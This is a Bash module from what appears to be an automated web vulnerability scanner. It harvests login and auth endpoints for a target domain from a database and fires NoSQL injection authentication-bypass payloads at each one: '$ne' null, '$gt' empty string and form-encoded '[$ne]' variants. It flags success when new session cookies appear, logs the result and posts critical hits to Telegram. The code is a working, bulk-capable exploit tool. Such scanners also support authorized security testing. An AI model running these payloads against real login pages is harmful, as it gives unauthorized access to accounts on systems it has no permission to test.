#!/usr/bin/env bash
# ============================================================
#  modules/48_nosql_injection.sh — Tier 3.2 NoSQL injection
#
#  Targets: login forms (POST /login, /api/auth) y JSON endpoints
#  Payloads:
#    - Auth bypass: {"user":{"$ne":null},"password":{"$ne":null}}
#    - Regex blind: {"password":{"$regex":"^a"}}
#    - Form-encoded: ?user[$ne]=null&password[$ne]=null
#  Detection: response auth bypass (200+session) vs baseline 401
# ============================================================

MODULE_NAME="nosql_injection"
MODULE_DESC="NoSQL injection — MongoDB/CouchDB auth bypass + regex blind"

_nosql_finding() {
  db_add_finding "$1" "nosql" "$5" "$3" "$4" "$6" "${7:-medium}" 2>/dev/null
  log_warn "  ⚡ [$5/${7:-medium}] NoSQL $4: $3"
  if [[ "${7:-medium}" != "low" ]] && [[ "$5" == "critical" || "$5" == "high" ]]; then
    _telegram_send "🔴 *NoSQL — $4*
🌐 \`$2\`
🔗 \`$3\`
📋 ${6:0:280}
📊 \`${5^^}\` / \`${7:-medium}\`" 2>/dev/null || true
  fi
}

_nosql_probe() {
  local URL="$1" DOMAIN_ID="$2" DOMAIN="$3"

  # Baseline: POST con creds inválidas
  local BASELINE_BODY='{"username":"hackeadora_invalid_'$RANDOM'","password":"invalid"}'
  _h_post_noredirect "$URL" "$BASELINE_BODY" --connect-timeout 8 \
    -H "Content-Type: application/json"
  local BASELINE_STATUS="$HTTP_LAST_STATUS"
  local BASELINE_BODY_RESP="${HTTP_LAST_BODY:0:1000}"
  local BASELINE_COOKIES; BASELINE_COOKIES=$(echo "$HTTP_LAST_HEADERS" | grep -ci "^set-cookie:")

  # Solo proceder si baseline da rejection (401/403/200-error)
  [[ "$BASELINE_STATUS" =~ ^(2[0-9][0-9])$ ]] && \
    echo "$BASELINE_BODY_RESP" | grep -qiE '"error"|"invalid"|"failed"|"incorrect"' || \
    [[ "$BASELINE_STATUS" =~ ^(401|403)$ ]] || return 1

  # Payload 1: $ne bypass
  local PAYLOAD='{"username":{"$ne":null},"password":{"$ne":null}}'
  _h_post_noredirect "$URL" "$PAYLOAD" --connect-timeout 8 \
    -H "Content-Type: application/json"
  local STATUS="$HTTP_LAST_STATUS" BODY="${HTTP_LAST_BODY:0:2000}"
  local COOKIES; COOKIES=$(echo "$HTTP_LAST_HEADERS" | grep -ci "^set-cookie:")

  # Auth bypass: status 200 + cookies set + body NO indica error
  if [[ "$STATUS" == "200" ]] && [[ "$COOKIES" -gt "$BASELINE_COOKIES" ]]; then
    if ! echo "$BODY" | grep -qiE '"error"|"invalid"|"failed"|"incorrect"|password.*incorrect'; then
      _nosql_finding "$DOMAIN_ID" "$DOMAIN" "$URL" "auth_bypass_ne_null" "critical" \
        "NoSQL auth bypass: {\$ne:null} acepta como login válido — status $STATUS, cookies set ($COOKIES vs baseline $BASELINE_COOKIES). Sample body: ${BODY:0:200}" \
        "high"
      return 0
    fi
  fi

  # Payload 2: $gt empty string
  PAYLOAD='{"username":{"$gt":""},"password":{"$gt":""}}'
  _h_post_noredirect "$URL" "$PAYLOAD" --connect-timeout 8 \
    -H "Content-Type: application/json"
  STATUS="$HTTP_LAST_STATUS"
  COOKIES=$(echo "$HTTP_LAST_HEADERS" | grep -ci "^set-cookie:")
  BODY="${HTTP_LAST_BODY:0:2000}"
  if [[ "$STATUS" == "200" ]] && [[ "$COOKIES" -gt "$BASELINE_COOKIES" ]]; then
    if ! echo "$BODY" | grep -qiE '"error"|"invalid"|"failed"'; then
      _nosql_finding "$DOMAIN_ID" "$DOMAIN" "$URL" "auth_bypass_gt_empty" "critical" \
        "NoSQL auth bypass: {\$gt:\"\"} valida sin password real. Status $STATUS, cookies set." \
        "high"
      return 0
    fi
  fi

  # Payload 3: form-encoded $ne
  PAYLOAD='username[$ne]=hackeadora_x&password[$ne]=hackeadora_y'
  _h_post_noredirect "$URL" "$PAYLOAD" --connect-timeout 8 \
    -H "Content-Type: application/x-www-form-urlencoded"
  STATUS="$HTTP_LAST_STATUS"
  COOKIES=$(echo "$HTTP_LAST_HEADERS" | grep -ci "^set-cookie:")
  if [[ "$STATUS" == "200" ]] && [[ "$COOKIES" -gt "$BASELINE_COOKIES" ]]; then
    BODY="${HTTP_LAST_BODY:0:2000}"
    if ! echo "$BODY" | grep -qiE '"error"|"invalid"|"failed"'; then
      _nosql_finding "$DOMAIN_ID" "$DOMAIN" "$URL" "auth_bypass_form_ne" "critical" \
        "NoSQL auth bypass via form-encoded [\$ne] — vulnerable URL parser de Express qs. Status $STATUS." \
        "high"
      return 0
    fi
  fi
  return 1
}

module_run() {
  local DOMAIN="$1" DOMAIN_ID="$2" OUT_DIR="$3"
  log_phase "Módulo 48 — $MODULE_DESC: $DOMAIN"
  source "${SCRIPT_DIR}/core/http_analyzer.sh" 2>/dev/null
  source "${SCRIPT_DIR}/core/finding_validators.sh" 2>/dev/null

  # Login endpoints candidatos
  local CANDIDATES
  CANDIDATES=$(sqlite3 "$DB_PATH" "
    SELECT DISTINCT url FROM urls
    WHERE domain_id=${DOMAIN_ID}
      AND (url LIKE '%/login%' OR url LIKE '%/auth%' OR url LIKE '%/signin%'
           OR url LIKE '%/api/login%' OR url LIKE '%/api/auth%' OR url LIKE '%/api/users/login%'
           OR url LIKE '%/api/v1/login%' OR url LIKE '%/api/v2/login%')
      AND url NOT LIKE '%.css%' AND url NOT LIKE '%.js%' AND url NOT LIKE '%.png%'
    LIMIT 15;" 2>/dev/null | sort -u)
  [[ -z "$CANDIDATES" ]] && { log_info "  Sin login endpoints candidatos"; return 0; }

  local TOTAL=0
  while IFS= read -r URL; do
    [[ -z "$URL" ]] && continue
    URL="${URL%%\?*}"
    _nosql_probe "$URL" "$DOMAIN_ID" "$DOMAIN" && ((TOTAL++))
  done <<< "$CANDIDATES"
  log_ok "$MODULE_DESC: $TOTAL NoSQL bypasses"
}
